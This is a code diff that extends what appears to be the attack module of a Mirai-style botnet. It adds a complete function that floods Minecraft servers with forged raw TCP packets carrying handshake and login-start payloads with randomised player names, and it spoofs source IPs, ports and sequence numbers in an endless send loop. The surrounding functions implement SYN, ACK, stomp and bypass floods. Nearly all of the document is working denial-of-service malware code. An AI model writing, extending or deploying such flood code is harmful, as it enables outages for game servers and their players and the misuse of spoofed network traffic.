@@ -171,7 +171,6 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
     
     cleanup_tcp_attack(pkts, targs_len, fd);
 }
-
 void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     uint16_t size = 0;
@@ -424,7 +423,6 @@ void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t o
         }
     }
 }
-
 void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd = -1;
@@ -715,7 +713,6 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     
     cleanup_tcp_attack(pkts, targs_len, fd);
 }
-
 void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, rfd = -1;
@@ -927,4 +924,225 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 cleanup_and_return:
     if (stomp_data) free(stomp_data);
     cleanup_tcp_attack(pkts, targs_len, rfd);
+}
+
+void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, fd = -1;
+    char **pkts = NULL;
+    
+    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 25565); // Minecraft default
+    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
+    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    
+    // Fixed values for Minecraft
+    int protocol_version = 763; // Minecraft 1.20.1 protocol version
+    int data_len = 150; // Fixed payload size for handshake + login
+
+    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    {
+#ifdef DEBUG
+        printf("Failed to create raw socket. Aborting attack\n");
+#endif
+        return;
+    }
+    
+    i = 1;
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
+    {
+#ifdef DEBUG
+        printf("Failed to set IP_HDRINCL. Aborting\n");
+#endif
+        cleanup_tcp_attack(NULL, 0, fd);
+        return;
+    }
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
+        cleanup_tcp_attack(NULL, 0, fd);
+        return;
+    }
+
+    for (i = 0; i < targs_len; i++)
+    {
+        struct iphdr *iph;
+        struct tcphdr *tcph;
+        unsigned char *payload;
+        unsigned char *ptr;
+
+        // Allocate packet buffer
+        pkts[i] = calloc(512, sizeof(char));
+        if (!pkts[i]) {
+            cleanup_tcp_attack(pkts, targs_len, fd);
+            return;
+        }
+        
+        iph = (struct iphdr *)pkts[i];
+        tcph = (struct tcphdr *)(iph + 1);
+        payload = (unsigned char *)(tcph + 1);
+        ptr = payload;
+
+        // Setup IP header
+        iph->version = 4;
+        iph->ihl = 5;
+        iph->tos = ip_tos;
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
+        iph->id = htons(ip_ident);
+        iph->ttl = ip_ttl;
+        if (dont_frag)
+            iph->frag_off = htons(1 << 14);
+        iph->protocol = IPPROTO_TCP;
+        iph->saddr = source_ip;
+        iph->daddr = targs[i].addr;
+
+        // Setup TCP header
+        tcph->source = htons(sport);
+        tcph->dest = htons(dport);
+        tcph->seq = htonl(seq);
+        tcph->ack_seq = htonl(ack);
+        tcph->doff = 5;
+        tcph->urg = 0;
+        tcph->ack = 1;  // ACK flag for established connection
+        tcph->psh = 1;  // PSH flag to push data
+        tcph->rst = 0;
+        tcph->syn = 0;
+        tcph->fin = 0;
+        tcph->window = htons(65535);
+    }
+
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            if (!pkts[i]) continue;
+            
+            char *pkt = pkts[i];
+            struct iphdr *iph = (struct iphdr *)pkt;
+            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+            unsigned char *payload = (unsigned char *)(tcph + 1);
+            unsigned char *ptr = payload;
+            
+            // Generate random player name (4-16 alphanumeric characters)
+            char player_name[17];
+            int name_len = 4 + (rand_next() % 13); // 4-16 characters
+            for (int j = 0; j < name_len; j++) {
+                int r = rand_next() % 62;
+                if (r < 10) player_name[j] = '0' + r;
+                else if (r < 36) player_name[j] = 'A' + (r - 10);
+                else player_name[j] = 'a' + (r - 36);
+            }
+            player_name[name_len] = 0;
+            
+            // Build Minecraft Handshake Packet (packet ID 0x00)
+            *ptr++ = 0x00; // Packet ID for handshake
+            
+            // Protocol version (763 for Minecraft 1.20.1)
+            int version = protocol_version;
+            while (version >= 0x80) {
+                *ptr++ = (version & 0x7F) | 0x80;
+                version >>= 7;
+            }
+            *ptr++ = version & 0x7F;
+            
+            // Server address (use target IP)
+            char ip_str[16];
+            uint32_t target_ip = targs[i].netmask < 32 ? 
+                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) :
+                targs[i].addr;
+            struct in_addr addr;
+            addr.s_addr = target_ip;
+            inet_ntop(AF_INET, &addr, ip_str, sizeof(ip_str));
+            int ip_len = strlen(ip_str);
+            
+            // Write string length
+            int len_temp = ip_len;
+            while (len_temp >= 0x80) {
+                *ptr++ = (len_temp & 0x7F) | 0x80;
+                len_temp >>= 7;
+            }
+            *ptr++ = len_temp & 0x7F;
+            
+            // Write IP string
+            memcpy(ptr, ip_str, ip_len);
+            ptr += ip_len;
+            
+            // Server port (use user-specified port or default)
+            uint16_t mc_port = htons(dport);
+            *ptr++ = (mc_port >> 8) & 0xFF;
+            *ptr++ = mc_port & 0xFF;
+            
+            // Next state: 2 (login)
+            *ptr++ = 0x02;
+            
+            // Build Login Start Packet (packet ID 0x00 in login state)
+            *ptr++ = 0x00; // Packet ID for login start
+            
+            // Player name length
+            len_temp = name_len;
+            while (len_temp >= 0x80) {
+                *ptr++ = (len_temp & 0x7F) | 0x80;
+                len_temp >>= 7;
+            }
+            *ptr++ = len_temp & 0x7F;
+            
+            // Player name
+            memcpy(ptr, player_name, name_len);
+            ptr += name_len;
+            
+            // Update target IP if netmask < 32 (already done above)
+            iph->daddr = target_ip;
+            
+            // Randomize source IP if specified
+            if (source_ip == 0xffffffff)
+                iph->saddr = rand_next();
+            
+            // Randomize IP ID
+            if (ip_ident == 0xffff)
+                iph->id = htons(rand_next() & 0xffff);
+            
+            // Randomize source port
+            if (sport == 0xffff)
+                tcph->source = htons(rand_next() & 0xffff);
+            
+            // Randomize sequence numbers
+            if (seq == 0xffff)
+                tcph->seq = htonl(rand_next());
+            if (ack == 0xffff)
+                tcph->ack_seq = htonl(rand_next());
+            
+            // Randomize TCP window
+            tcph->window = htons(rand_next() & 0xffff);
+            
+            // Update IP checksum
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+
+            // Update TCP checksum
+            tcph->check = 0;
+            int payload_len = ptr - payload;
+            int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
+            iph->tot_len = htons(total_len);
+            
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_len), 
+                                        sizeof(struct tcphdr) + payload_len);
+
+            // Send packet
+            targs[i].sock_addr.sin_addr.s_addr = target_ip;
+            targs[i].sock_addr.sin_port = tcph->dest;
+            sendto(fd, pkt, total_len, MSG_NOSIGNAL, 
+                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+        }
+#ifdef DEBUG
+        if (errno != 0)
+            printf("errno = %d\n", errno);
+#endif
+    }
+    
+    cleanup_tcp_attack(pkts, targs_len, fd);
 }
